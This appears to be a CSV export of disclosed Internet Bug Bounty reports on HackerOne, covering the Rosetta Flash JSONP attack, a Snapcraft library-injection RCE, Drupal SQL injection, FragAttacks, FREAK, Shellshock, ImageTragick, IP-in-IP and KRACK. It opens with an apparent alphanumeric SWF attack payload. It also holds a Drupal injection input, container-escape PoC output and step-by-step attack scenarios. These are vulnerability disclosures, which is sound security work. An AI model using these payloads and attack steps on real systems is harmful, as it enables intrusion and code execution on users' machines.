    CWSA7000hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtWGDtGDGwwwDDGDG0Gt0GDGwtGDG0sDttwwwDG33w0sDDt03G33333sDfBDIHTOHHoKHBhHZLxHHHrlbhHHtHRHXXHHHdHDuYAENjmENDaqfvjmENyDjmENJYYfmLzMENYQfaFQENYnfVNx1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwwEDG3w0sG0stDDGtw0GDDwwwt3wt333333w03333gFPaEIQSNvTnmAqICTcsacSCtiUAcYVsSyUcliUAcYVIkSICMAULiUAcYVq9D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwuG333swG033GDtpDtDtDGDD33333s03333sdFPOwWgotOOOOOOOwodFhfhFtFLFlHLTXXTXxT8D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7kiudIbEAt33swwEGDDtDG0GGDDwwwDt0wDGwwGG0sDDt033333GDt333swwv3sFPDtdtthLtDdthTthxthXXHHHHhHHHHHHhHXhHHHHXhXhXHXhHhiOUOsxCxHwWhsXKTgtSXhsDCDHshghSLhmHHhDXHhEOUoZQHHshghoeXehMdXwSlhsXkhehMdhwSXhXmHH5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwGNqdIbe133333333333333333sUUef03gfzA8880HUAH
The embedder site can specify the SWF to load through the ""name"" property of the object tag. The specified SWF file could be a [cross domain proxy] that can make HTTP requests for the embedder site.
Related work
This attack is inspired by Alok Menghrajani's [related work], where he showed that it is possible to assemble a Flash file in the [\x01-\0x7F] byte range to prove that certain JSONP endpoints are not secure.
The real contribution of my work is the demonstration of the fact that this attack is also feasible in the [A-Za-z0-9] character range. This is critical because overwhelming majority of the JSONP endpoints only accept this character range in the callback name.
Mitigation
Limiting the callback name length is not a good solution, as there is no strong guarantee that it is not possible to come up with an SWF file that conforms to this tightened filter.
The API maintainer can mitigate this type of attack by putting an empty JavaScript callback in front of the callback name in the repsonse. This makes it impossible to control the first bytes of the response.
An other protection would be hosting JSONP APIs on a sandbox domain. The latter solution is only effective if there's no crossdomain.xml rule that would allow requests from the sandbox domain to the main domain.
A proper solution would be changing the way Flash handles malformed SWF files so that it won't files with additional data at the end of the SWF file.
Although one of the mitigations is fixing Flash, I don't consider this a Flash vulnerability, as an affected site does not even have to use the Flash technology in order to be vulnerable.
Affected sites
I've tested the 35 top websites on Wikipedia's (somewhat out of date) copy of the Alexa toplist (after unifying www.google.* domains into a single entry), and 16 (~45%) of them proved to be vulnerable.
The unaffected sites fall into the following categories:

Sites that simply don't have any JSONP API.
Google and Facebook: JSONP answers from these sites begin with empty JavaScript comments (probably because they are being extremely cautious and implemented this protection after the publication of Alok Menghrajani's [related work]).
Sites that host all JSONP APIs on a different domain (this is considered as a best practice) and don't have crossdomain.xml rule on the main site that enables cross domain requests from the API domain.
A single site limits the callback name length to 50 characters.

DEMO
JSONP: http://json-p.org/
ascii-zip: https://github.com/molnarg/ascii-zip
cross domain proxy: https://github.com/borisreitman/CrossXHR
related work: http://quaxio.com/jsonp_handcrafted_flash_files/
toplist: http://en.wikipedia.org/wiki/List_of_most_popular_websites",https://hackerone.com/reports/10373,No value,No value,No value,2014,4,29,23,54
Internet Bug Bounty,1-10,1.0,No value,$750.00,Medium,6.8,None,Canonical Snapcraft vulnerable to remote code execution under certain conditions,"itszn  submitted a report to Internet Bug Bounty.Jan 7th (2 years ago)Preface: I apologize for previously submitting this bug to hacker1 before it was fully addressed by the Ubuntu Security Team
I have reported this issue to the Ubuntu Security team and it has been fixed:
CVE-2020-27348
Bug link: https://bugs.launchpad.net/snapcraft/+bug/1901572
Ubuntu Security Team Disclosure: https://discourse.ubuntu.com/t/usn-4661-1-snapcraft-vulnerability/19640
Commit fixing the issue in snapcraft: https://github.com/snapcore/snapcraft/commit/a0ceca9d531a34c979251030ed67b5fa2abfdd9a
I waited an month before submitting this report (which has additional non-public exploitation details) to allow users to update. See Example Attack Scenarios for ways this bug could have been used.
Background:
Snapcraft is a Ubuntu project which allows applications to be bundled in containers, installed easily by users, and allow automatic updates of individual packages. Snapcraft is becoming more and more the main way to install packages on Ubuntu systems (including server). For example installing Chromium on Ubuntu 20+ will now install the Snapcraft package instead of the normal apt package. Many users/servers may be using snapcraft installed packages without knowing it. Additionlly Ubuntu recommends installing packages using Snapcraft and even prompts users when they try to run non-installed applications:
Code 157 BytesWrap lines Copy Download1itszn@ubuntu:~$ docker
2
3Command 'docker' not found, but can be installed with:
4
5sudo snap install docker
6...
7
8See 'snap info docker' for additional versions.
Bug Description:
Snapcraft before 4.4.4 is vulnerable to library inclusion from the current working directory. This allowed attackers to gain remote code execution in almost any application that was installed with snapcraft, when run in an attacker controlled directory. This could be as simple as running an application in a cloned git repository.
The bug is due to incorrect bash script generation when creating confined snap packages. Snapcraft will generate wrapper scripts to run the application, but accidently uses empty variables to define the LD_LIBRARY_PATH for the application. Due to a quirk with LD, empty path entries are treated as current working directory. This means that any libraries (for example libc.so.6) in the current working directory will be loaded into the snap application when run. (Additionally LD will search several subdirectories including tls).
A malicious library could easily be crafted to run arbitrary remote code when a snap application is run. This code will run inside the snap container so it will initially be somewhat restricted and can only access any files in the users home directory (excluding dotfiles). However due to many apps also including X11 permissions, it is fairly trivial to escape the container using X11 commands. This would give an attacker full access to the system as the current user.
Fix
Snapcraft fixed the issue in the script generator by including a check for empty string. However for the fix to be applied, application authors must ""refresh"" their app, regenerating the vulnerable files. This means that many applications are still vulnerable (ie chromium and docker) until re-generated correctly.
POC
Attached is both the POC archive which should still work against chromium. Additionally is a script that generates the malicious libc.so.6
Code 1.25 KiBWrap lines Copy Download1itszn@ubuntu:~$ tar xfvz snap-escape
2itszn@ubuntu:~$ cd snap-escape
3itszn@ubuntu:snap-escape$ ls
4total 8
5-rw-rw-r-- 1 itszn itszn    0 Oct 25 11:04 amazing-movie.mp4
6-rw-rw-r-- 1 itszn itszn    0 Oct 25 11:28 cool-page.html
7-rw-rw-r-- 1 itszn itszn 2193 Oct 25 11:45 README.txt
8drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:28 tls
9itszn@ubuntu:snap-escape$ chromium
10Got code execution running as itszn inside snap container!
11
12We can read/write any non-hidden (non-dot) file in
13+ echo 'Hello from snap code exec' > /home/itszn/pwned
14+ cat /home/itszn/pwned
15Hello from snap code exec
16
17However we are still restricted by the container
18
19We cannot access dotfiles
20+ echo 'echo PWNED' >> /home/itszn/.bashrc
21./tls/s: 20: ./tls/s: cannot create /home/itszn/.bashrc: Permission denied
22
23Or other non-home files
24+ cat /etc/issue
25cat: /etc/issue: Permission denied
26
27Luckily, this snap has the x11 plug
28We can use this escape the container!
29Starting container escape...
30
31
32
33Escape Success!
34
35We are now running code outside of snap container, we now have full privs of itszn
36
37For example we now can read /etc/issue:
38+ cat /etc/issue
39Ubuntu 18.04.4 LTS \n \l
40
41
42Or modify dotfiles
43+ echo 'echo PWNED' >> /home/itszn/.bashrc
44+ tail -n 1 /home/itszn/.bashrc
45echo PWNED
46
47Full escape and code execution~!
Impact
In many situations, an attacker could gain full access to a user's system running as the current user. The following are example attack scenarios demonstrating how an attacker could abuse this bug against users.
Example Attack Scenarios:
Scenario 1: VLC

Attacker creates a malicious archive containing a video file. Like before the malicious library is hidden in a tls directory to prevent suspicion (potentially even disguised as subtitle information)
The target user wants to view the video file and downloads the archive. They extract the archive and find the video file:

Code 299 BytesWrap lines Copy Download1itszn@ubuntu:~$ tar xfvz movie.tar.gz && cd movie
2itszn@ubuntu:movie$ ls
3total 8
4-rw-rw-r-- 1 itszn itszn    0 Oct 25 11:04 amazing-movie.mp4
5-rw-rw-r-- 1 itszn itszn 2193 Oct 25 11:45 README.txt
6drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:28 tls
7drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:29 tls_subtitles

The user now runs VLC, which they installed using snapcraft (VLC is one of the top Snapcraft apps according to the Snap store).

Code 43 BytesWrap lines Copy Download1itszn@ubuntu:movie$ vlc ./amazing-movie.mp4

At this point the attacker has achived coded exction in the VLC container. The attacker can use the X11 plug to trivially escape this container.
The attacker now has full access to the system as the user

Scenario 2: Chromium

Attacker adds malicious library into a github reposity. The library is hidden in a tls directory in the repo (making it harder to be noticed by the target user). 
Target user clones the git repo and opens the html file with chromium (which since Ubuntu 20 is always installed as a Snapcraft package):

Code 373 BytesWrap lines Copy Download1itszn@ubuntu:~$ git clone git@github.com:example/example-site.git && cd example-site
2itszn@ubuntu:example-site$ ls
3total 8
4-rw-rw-r-- 1 itszn itszn    0 Oct 27 14:31 some_page.html
5drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:29 css
6drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:29 js
7drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:28 tls
8itszn@ubuntu:example-site$ chromium ./some_page.html

Normally to compromise a user from a webpage both a browser exploit and a sandbox escape are required. However as the malicious library is injected before any sandboxing is applied, the attacker does not need to escape the Chromium Sandbox. The attacker now has remote code execution in the chromium container. Additionally this works even if the user already has chromium open (normally it would just tell the other chromium to load the page).
As before, the attacker can use the X11 plug to trivially escape this container.
The attacker now has full access to the system as the user

NOTE: From my testing, Chromium is still vulnerable as they need to manually refresh their snap packages to apply the fix.
Scenario 3: Docker

Attacker adds malicious library into a github reposity. The library is hidden in a tls directory in the repo (making it harder to be noticed by the target user). 
Target user clones the git repo, inspects the Dockerfile, and then builds the docker image. (NOTE: The dockerfile is non malicious. Under normal operation, there would be no risk. The user additionally can validate that the image would normally not attach any files or volumes).

Code 328 BytesWrap lines Copy Download1itszn@ubuntu:~$ git clone git@github.com:example/example-app.git && cd example-app
2itszn@ubuntu:example-app$ ls
3total 8
4-rw-rw-r-- 1 itszn itszn    0 Oct 27 14:31 some_code.js
5-rw-rw-r-- 1 itszn itszn 109 Oct 27 14:22 Dockerfile
6drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:28 tls
7itszn@ubuntu:example-app$ docker build -t some_app .

At this point the attacker has gained remote coded execution in the  Snapcraft container. The docker container can read/write the entirety of the user's home directory (additionally including dotfiles). At this point the attacker could trivially backdoor any dotfile or configuration file in the user's home directory to gain full code execution outside the container.

NOTE: From my testing, Docker is still vulnerable as they need to manually refresh their snap packages to apply the fix.
Final Notes
I personally think this is a very large impact as it meant many applications became vulnerable due to being installed with snapcraft (including chromium!). As Ubuntu transitions more users to Snapcraft this impact would have grown as more apps became vulnerable.2 attachments:F1147458: snap-escape-POC.tar.gzF1147459: make_libc.pyitszn   posted a comment. Jan 8th (2 years ago)Update: The chrome team has now released a new snap package, fixing their vulnerability to this issueitszn   posted a comment. Jan 8th (2 years ago)If you want to test the POC, I found that the Audacity snap is still vulnerable and should hopefully work out of the box with the POC.
Code 26 BytesWrap lines Copy Download1sudo snap install audacitystaple   changed the status to Triaged. Jan 9th (2 years ago)Hello @itszn,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Regards,
@staplereed   closed the report and changed the status to Resolved. Jul 23rd (about 1 year ago)Hi @itszn,
On behalf of the Internet Bug Bounty Panel, thank you for your continued patience on this report. The IBB is undergoing a review of all its in-scope projects and has decided to shut down this program indefinitely.
In an effort to reward researchers for their hard work and patience thus far, the IBB panel has elected to pay bounties to all valid reports at our minimum bounty amount.
As an act of good faith, we will also close this report as Resolved.
Thank you for helping keep the internet safe and secure!
-The Internet Bug Bounty PanelInternet Bug Bounty  rewarded itszn with a $750 bounty. Jul 23rd (about 1 year ago)reed   requested to disclose this report. Jul 23rd (about 1 year ago)itszn   agreed to disclose this report. Jul 23rd (about 1 year ago)  This report has been disclosed. Jul 23rd (about 1 year ago)",https://hackerone.com/reports/1073202,No value,No value,No value,2021,1,7,3,27
Internet Bug Bounty,1-10,1.0,No value,$750.00,High,7.0,Buffer Over-read,CVE-2020-9383 Floppy OOB read,"jordyzomer  submitted a report to Internet Bug Bounty.Jun 5th (2 years ago)A vulnerability was found in Linux Kernel up to 5.5.6 (Operating System) and classified as critical. Affected by this issue is the function set_fdc of the file drivers/block/floppy.c. The manipulation with an unknown input leads to a memory corruption vulnerability (Out-of-Bounds). Using CWE to declare the problem leads to CWE-125. Impacted is confidentiality, integrity, and availability.
The weakness was disclosed 02/25/2020 by Jordy Zomer (GitHub Repository). The advisory is shared for download at github.com. This vulnerability is handled as CVE-2020-9383 since 02/24/2020. The attack needs to be approached locally. 
References:
http://lists.opensuse.org/opensuse-security-announce/2020-03/msg00039.html
https://github.com/torvalds/linux/commit/2e90ca68b0d2f5548804f22f0dd61145516171e3
https://security.netapp.com/advisory/ntap-20200313-0003/
Impact
A local attacker could use this to cause a denial of service (system crash) or expose sensitive information.",https://hackerone.com/reports/891846,No value,No value,No value,2020,6,5,11,12
Internet Bug Bounty,1-10,1.0,No value,"$3,000.00",No value,0.0,SQL Injection,Drupal 7 pre auth sql injection and remote code execution,"shorst  submitted a report to Internet Bug Bounty.Oct 17th (8 years ago)Motivation
I found a SQL Injection bug in Drupal < 7.32. Which can lead to a code execution. 
You need not have any user or knowledge of the targeted site.
Since Drupal is used as they state by ""millions of websites and applications"" I thought about applying for this bug bounty.
The Bug
Drupal uses Prepared Statements to secure the SQL Querys from Injections. To handle IN statements they created a expandArguments function, which uses the Array keys to create names for the placeholders. 
    foreach ($data as $i => $value) {
[...]
$newkeys[$key . '' . $i] = $value;
}
The function assumes that it is called with an array which has no keys. Example:
    db_query(""SELECT * FROM {users} where name IN (:name)"", array(':name'=>array('user1','user2')));
Which results in this SQL Statement
    SELECT * from users where name IN (:name_0, :name_1)
with the parameters name_0 = user1 and name_1 = user2.
The Problem occurs, if the array has keys, which are no integers. Example:
    db_query(""SELECT * FROM {users} where name IN (:name)"", array(':name'=>array('test) -- ' => 'user1','test' => 'user2')));
this results in an exploitable SQL query:
     SELECT * FROM users WHERE name IN (:name_test) -- , :name_test )
with parameters :name_test = user2.
Since Drupal uses PDO, multi-queries are allowed. So this SQL Injection can be used to insert arbitrary data in the database, dump or modify existing data or drop the whole database.
With the possibility to INSERT arbitrary data into the database an attacker can execute any PHP code through a manipulated Session and Drupal features with callbacks.
Advisory
https://www.sektioneins.de/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
CVE Information
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name CVE-2014-3704 to this vulnerability.
Poc
I included two PoCs. The first creates one request to create a session which has Admin privileges (UserID 1). The second executes code with only one request and destroys the session afterwards to not create a new Database entry. Some parts of the Second PoC were discovered with help of my coworker Stefan Esser.1 attachment:F18972: poc.tgz",https://hackerone.com/reports/31756,No value,No value,No value,2014,10,17,10,50
Internet Bug Bounty,1-10,1.0,No value,$750.00,No value,0.0,Cryptographic Issues - Generic,Fragmentation and Aggregation Flaws in Wi-Fi,"vanhoefm  submitted a report to Internet Bug Bounty.Jun 19th (about 1 year ago)I discovered three design flaws in the Wi-Fi standard and widespread related implementation flaws (see GitHub overview and test tool). Here I'll specifically cover open source software. These findings have not received bug bounties from other sources.
Implementation flaws allowing trivial packet injection


CVE-2020-26140: Accepting plaintext data frames in a protected network. This allows trivial packet injection. On a Linux client, the AWUS036H network card is vulnerable and two out of four Linux-based home routers were vulnerable. On NetBSD access points, three out of four tested network cards were vulnerable, and on FreeBSD access points, the F5D8053 network card was vulnerable.


CVE-2020-26143: Accepting fragmented plaintext data frames in a protected network. This allows trivial packet injection. On a Linux client, 7 out of 16 network cards were vulnerable. On FreeBSD access points, two out of four tested network cards were vulnerable.


CVE-2020-26145: Accepting plaintext broadcast fragments as full frames. This allows trivial packet injection. All tested network cards on NetBSD and FreeBSD access points were vulnerable. On a Linux client, only the TWFM-B003D network card was vulnerable.


CVE-2020-26144: Accepting plaintext A-MSDU frames that start with an RFC1042 header with EtherType EAPOL. This allows trivial packet injection. On a Linux client, the AWUS036ACH and TWFM-B003D network cards were vulnerable. All 6 tested FreeBSD network cards were vulnerable (both as clients and access points).


Other implementation vulnerabilities


CVE-2020-26139: the access point forwards EAPOL frames even if the client isn't yet authenticated. This allows an adversary to perform the aggregation attack (see below) against any client by simply being within radio range (i.e. no social engineering needed). All NetBSD and FreeBSD access points were vulnerable, as were two out of four Linux-based home routers.


CVE-2020-26146: reassembling encrypted fragments with non-consecutive packet numbers. This can be abused to exfiltrate data, under the condition that another device sends fragmented frames. All tested open source Wi-Fi implementations were vulnerable (FreeBSD, NetBSD, FullMAC Linux drivers) except SoftMAC Linux drivers.


CVE-2020-26147: reassembling mixed encrypted/plaintext fragments. The impact ranges from data exfiltration to packet injection, under the condition that another device sends fragmented frames. All open source Wi-Fi implementations were vulnerable (Linux, FreeBSD, NetBSD, Linux, etc).


CVE-2020-26142: processing fragmented frames as full frames. This can be abused to inject packets, under the condition that the another device sends fragmented frames, and in most cases requires (minor) social engineering. Among open source platforms, only OpenBSD was vulnerable.


CVE-2020-26141: not verifying the TKIP MIC of fragmented frames. This can be abused to exfiltrate and inject packets in old WPA1 networks. On Linux, only the NWD6505 and AWUS036ACM network cards were vulnerable.


Design flaws


Aggregation Attack (CVE-2020-24588): the A-MSDU flag in the plaintext Wi-Fi header is not authenticated. This can be abused, usually in combination with minor social engineering, to inject arbitrary packets to a victim. All 802.11n-compatible open source implementations were vulnerable (Linux, FreeBSD, OpenBSD, etc).


Mixed Key Attack (CVE-2020-24587): a receiver will reassemble fragments that were decrypted using different keys. Under very rare conditions this can be abused to exfiltrate data. All open source Wi-Fi implementations were vulnerable (FreeBSD, NetBSD, Linux, etc) except OpenBSD because it doesn't support fragmentation.


Fragment Cache Attack (CVE-2020-24586): a receiver will not clear fragments from memory when reconnecting or reassociating to a Wi-Fi network. Under the right conditions this can be abused to exfiltrate data. Under very rare conditions it can also be abused to inject arbitrary packets towards clients. Most open source Wi-Fi implementations were vulnerable (FreeBSD, Linux, etc) with the exception of OpenBSD and NetBSD.


Impact
As indicated above, there are two impacts:


Arbitrary packet injection: this clearly breaks the security of Wi-Fi. A first practical example is that this can be abused to make a client use a malicious DNS server to subsequently intercept all traffic (and perform SSL stripping attacks). As second practical example, the adversary can abuse packet injection to ""punch holes in the NAT"" to then directly attack internal devices (e.g. exploit internet-of-things devices or exploit BlueKeep against outdated Windows 7 machines). See this addendum for the technical details or watch three demos.


Data exfiltration: this is only possible if another device sends fragmented frames. In practice this is rare unless Wi-Fi 6 is used. Additionally, the data can only be exfiltrated if no higher-layer encryption is used (i.e. TLS will prevent data exfiltration).


Finally, I've also contributed patches to these open source projects:


Linux: I wrote patches to prevent all attacks. Additional defense-in-depth and driver-specific patches were added by Linux developers.


Wi-Fi standard: I'm helping to update the 802.11 standard to fix the design flaws (starting with A-MSDU fixes).


FreeBSD: I wrote patches to mitigate vulnerabilities in FreeBSD. These patches are now under review [1, 2, 3].


NetBSD: I submitted initial patches. The remaining patches are in progress.


OpenBSD: I reviewed patches related to A-MSDU vulnerabilities resulting in more secure patches.",https://hackerone.com/reports/1238470,No value,No value,No value,2021,6,19,21,24
Internet Bug Bounty,1-10,1.0,No value,"$7,500.00",No value,0.0,Cryptographic Issues - Generic,FREAK: Factoring RSA_EXPORT Keys to Impersonate TLS Servers,"prosecco-inria  submitted a report to Internet Bug Bounty.Mar 5th (8 years ago)Many TLS servers, including those hosting sensitive websites such as
www.nsa.gov and connect.facebook.net, support weak EXPORT_RSA ciphersuites.
By factoring their 512-bit ephemeral RSA keys, a network attacker is able to impersonate
these websites to web browsers and more generally, to client applications relying on
vulnerable TLS libraries. We have demos showing these attacks at www.smacktls.com
Who's vulnerable
Vulnerable TLS client-side libraries (and web browsers) include:

SecureTransport (used by Safari on iOS and OS X)
SChannel (used by Internet Explorer)
OpenSSL versions <= 1.0.1j (used by Android Browser and BlackBerry Browser)
BoringSSL versions before Nov 10, 2014 (used by Chrome <= version 40 on OS X, iOS, Android, Windows)
LibReSSL versions <= 2.1.1
IBM JDK 

OpenSSL 1.0.1k fixes the vulnerability (CVE-2015-0204)
Vulnerable TLS servers are listed and updated at: http://www.freakattack.com
We reported the attack to Akamai, Facebook, FBI, and many banks.
Attack Details
More details are below, in the attached research paper, and on the website: www.smacktls.com#freak
We show a server impersonation attack relying on the following:
(1) Many TLS servers support various EXPORT ciphersuites which are
now considered obsolete and breakable. For instance, the
TLS_RSA_EXPORT_WITH_RC4_40_MD5 ciphersuite relies on a ephemeral
512-bit RSA key that typically stays constant over the lifetime of the
TLS server. Breaking this key allows a network attacker to impersonate
the server to any client that accepts an EXPORT_RSA handshake.
(2) Several TLS client libraries, including e.g. OpenSSL
(<=1.0.1j), accept an EXPORT_RSA ServerKeyExchange
during a regular RSA handshake. For the gory details of this bug, see
the attached research paper.  In effect, these clients are willing to
replace the certificate's public key with a signed ephemeral public
key sent by the server (even if the ephemeral key is very short.)
OpenSSL 1.0.0k fixed this bug (CVE-2015-0204) but previous versions of
OpenSSL (used in Android browsers) and other clients listed above
are vulnerable.
(3) 512-bit keys can now be factored in a few hours. With the help of
Prof. Nadia Heninger who used cado-nfs (http://cado-nfs.gforge.inria.fr/)
to run factoring tasks on the Amazon EC2 cloud, we were able to factor
the ephemeral EXPORT_RSA keys for multiple server instances of
www.nsa.gov and connect.facebook.net. Each factoring task took between
7 and 11 hours and cost about $70-$100.
We note that the EXPORT_RSA keys for TLS servers seem to remain the
same for several days (at least), which makes us think they are only
refreshed when the server instance is rebooted.
DEMO
Putting these three elements together, we have demos that impersonate
various HTTPS websites to the Safari web browser. 
See: http://www.smacktls.com
The demo shows how a network attacker can
(a) hijack HTTPS connections to www.nsa.gov to tamper with the careers page
(b) hijack HTTPS connections to the Facebook JavaScript SDK to inject malicious
scripts in innocent third-party websites
Countermeasures
We are already in touch with Apple, IBM, Microsoft and Google to fix the
RSA_EXPORT bug on the client-side libraries. However, it seems likely
that many clients will continue to use older versions of these
libraries (e.g. Android cannot be easily updated.)
We recommend that all TLS servers stop supporting EXPORT_RSA
ciphersuites. This would protect the hosted websites.1 attachment:F30946: smack.pdf",https://hackerone.com/reports/50170,No value,No value,No value,2015,3,5,16,18
Internet Bug Bounty,1-10,1.0,No value,"$20,000.00",No value,0.0,None,GNU Bourne-Again Shell (Bash) 'Shellshock' Vulnerability,"stephane-chazelas  submitted a report to Internet Bug Bounty.Sep 24th (8 years ago)GNU Bash versions 1.14 through 4.3 contain a flaw that processes commands placed after function definitions in the added environment variable, allowing remote attackers to execute arbitrary code via a crafted environment which enables network-based exploitation.  
Original disclosure: http://www.openwall.com/lists/oss-security/2014/09/24/11
Detailed analysis by lcamtuf:

http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html
http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html
  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)Internet Bug Bounty  rewarded stephane-chazelas with a $20,000 bounty. Oct 3rd (8 years ago)",https://hackerone.com/reports/29839,No value,No value,No value,2014,9,24,0,0
Internet Bug Bounty,1-10,1.0,No value,"$3,000.00",No value,0.0,Memory Corruption - Generic,Heap overflow in H. Spencer’s regex library on 32 bit systems,"guido  submitted a report to Internet Bug Bounty.Feb 15th (8 years ago)The IBB's programs provide a great incentive for me to find vulnerabilities in open source software. With this one I set out to find a vulnerability in PHP and discovered that the vulnerability that I found exists in a wider constellation of applications, including BSD libc's. IBB's Alex Rice's advice to contact CERT was very helpful. Judging by the amount of visitors of my blog article on the vulnerability, contacting CERT helped greatly in disseminating awareness and prompting maintainers to implement remedies, so thank you for that.
My original write-up: https://guidovranken.wordpress.com/2015/02/04/full-disclosure-heap-overflow-in-h-spencers-regex-library-on-32-bit-systems/
cert.org: http://www.kb.cert.org/vuls/id/695940
NetBSD: http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/regex/regcomp.c
FreeBSD: https://github.com/freebsd/freebsd/commit/70c79b42a2551445f9a05cb0a6573d813587302a
Dragonfly BSD: http://gitweb.dragonflybsd.org/dragonfly.git/commit/2841837793bd095a82f477e9c370cfe6cfb3862c
LLVM: http://lists.cs.uiuc.edu/pipermail/llvm-commits/Week-of-Mon-20150202/257966.html
Redhat: https://bugzilla.redhat.com/show_bug.cgi?id=1191049
Debian: https://bugs.debian.org/cgi-bin/pkgreport.cgi?correspondent=luciano%40debian.org;include=subject%3Aregex;dist=unstable
PHP is vulnerable, albeit in a deprecated set of functions, and the vulnerability can be exposed to the internet with a single line of PHP code. I have both filed a format bug report on their bug tracker and enquired about the status of said report at their security mail address, and as of present I have not received a response yet. The vulnerable code is statically included with PHP (ie. the presence of the vulnerability in PHP does not depend on the underlying libc).
Android's Bionic libc may also be vulnerable since it includes the vulnerable code in its upsteam-netbsd directory ( https://github.com/android/platform_bionic/blob/7dd126a38ca501818b07927f310dcc0f531c0f1f/libc/upstream-netbsd/lib/libc/regex/regcomp.c#L270 ). I'm not sure if it's directly vulnerable but if you wish so I can try my best to check if it is.
Thanks,
Guido",https://hackerone.com/reports/47779,No value,No value,No value,2015,2,15,3,28
Internet Bug Bounty,1-10,1.0,No value,"$7,500.00",No value,0.0,None,Insufficient shell characters filtering leads to (potentially remote) code execution (CVE-2016-3714),"stewie  submitted a report to Internet Bug Bounty.Apr 21st (7 years ago)The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT, (6) SHOW, (7) WIN, and (8) PLT coders in ImageMagick before 6.9.3-10 and 7.x before 7.0.1-1 allow remote attackers to execute arbitrary code via shell metacharacters in a crafted image, aka ""ImageTragick."" 
See also:
http://www.openwall.com/lists/oss-security/2016/05/03/18
https://imagetragick.com/",https://hackerone.com/reports/143966,No value,No value,No value,2016,4,21,0,0
Internet Bug Bounty,1-10,1.0,No value,$750.00,Medium,5.3,Improper Access Control - Generic,IP-in-IP protocol routes arbitrary traffic by default - CVE-2020-10136,"b0d64187f5efdafc3907928  submitted a report to Internet Bug Bounty.Jun 8th (2 years ago)Many machines (150K-180K) on the internet accept and route IP over IP by default.
IP-in-IP encapsulation is a tunneling protocol specified in RFC 2003 that allows for IP packets to be encapsulated inside another IP packets. This is very similar to IPSEC VPNs in tunnel mode, except in the case of IP-in-IP, the traffic is unencrypted. As specified, the protocol unwraps the inner IP packet and forwards this packet through IP routing tables, potentially providing unexpected access to network paths available to the vulnerable device. An IP-in-IP device is considered to be vulnerable if it accepts IP-in-IP packets from any source to any destination without explicit configuration between the specified source and destination IP addresses. This unexpected Data Processing Error (CWE-19) by a vulnerable device can be abused to perform reflective DDoS and in certain scenarios used to bypass network access control lists. Because the forwarded network packet may not be inspected or verified by vulnerable devices, there are possibly other unexpected behaviors that can be abused by an attacker on the target device or the target device's network environment.
See full details here (""Description"" copied here):
https://kb.cert.org/vuls/id/636397
Impact
An unauthenticated attacker can route network traffic through a vulnerable device, which may lead to reflective DDoS, information leak and bypass of network access controls.",https://hackerone.com/reports/893922,No value,No value,No value,2020,6,8,15,56
Internet Bug Bounty,1-10,1.0,No value,"$25,000.00",Medium,6.8,"Reusing a Nonce, Key Pair in Encryption",Key Reinstallation Attacks: Breaking WPA2 by forcing nonce reuse,"vanhoefm  submitted a report to Internet Bug Bounty.Nov 2nd (5 years ago)Full background information is at krackattacks.com and all detailed information can be found in our research paper.
Key Reinstallation Attack: 4-way handshake example
We use the 4-way handshake to illustrate the idea behind key reinstallation attacks (CVE-2017-13077).
Note that in practice, all protected Wi-Fi network rely on the 4-way handshake to derive a fresh session key (PTK) from some shared secret.
Step 1. Channel-based man-in-the-middle and initial handshake messages:

The adversary clones the access point (AP) on a different channel. Say the real AP is on channel 6, and it will be cloned on channel 1.
The adversary uses Channel Switch Announcements to force victims into connecting to the cloned AP on channel 1.
The adversary forwards the first three message of the 4-way handshake between the client and AP (i.e. the adversary fowards frames over the different channels).
After the client receives message 3 of the handshake, it will install the fresh session key (PTK) for the first time.

Step 2. Triggering a key reinstallation:

The attacker does not forward message 4 of the handshake to the AP, effectively blocking it.
As a result, the AP will retransmit message 3 to the client.
After the client receives message 3, it responds with message 4. In practice all clients encrypt this retransmitted message 4 at the link layer. Note that it's encrypted because message 4 an ordinary data frame, and the victim has already installed the session key to encrypt data frames (recall end of step 1). The victim will use a nonce value of 1 to encrypt message 4.
After sending message 4, the client will reinstall the session key. This resets the transmit nonce to zero.

Step 3. Abusing nonce reuse:

When the client now transmit a normal encrypted data frame, it will increment the nonce counter, and then reuse the nonce value 1 when encrypting the data frame.
We can derive known keystream from the encrypted retransmitted message 4 (recall step 2), and use this to decrypt parts of the just transmitted encrypted data frame.
Other predictable packets (ARP, DHCP, HTML, and so on) can be used to obtain additional known plaintext and keystream, which can in turn be used to decrypt more and bigger packets.

The above example attack against the 4-way handshake is also illustrated in my CCS'17 presentation.
Other handshakes
Other Wi-Fi handshakes or features that were found to be vulnerable to key reinstallation attacks are:

Reinstallation of group keys in the 4-way handshake: CVE-2017-13078 and CVE-2017-13079
The group key handshake: CVE-2017-13080 and CVE-2017-13081
The Fast BSS Transition (FT) handshake: CVE-2017-13082
The PeerKey handshake: CVE-2017-13084
The Tunneled Direct-Link Setup (TDLS) handshake: CVE-2017-13086
Handling of Wireless Network Management (WNM) Sleep Mode Response frame: CVE-2017-13087 and CVE-2017-13088.

Countermeasures
Implementations can be updated to prevent key reinstallation attacks in a backwards-compatible manner.
As an additional mitigation, an access point can also prevent most attacks against vulnerable clients.
In particular, attacks against the 4-way handshake can be prevented by not retransmitting message 3.
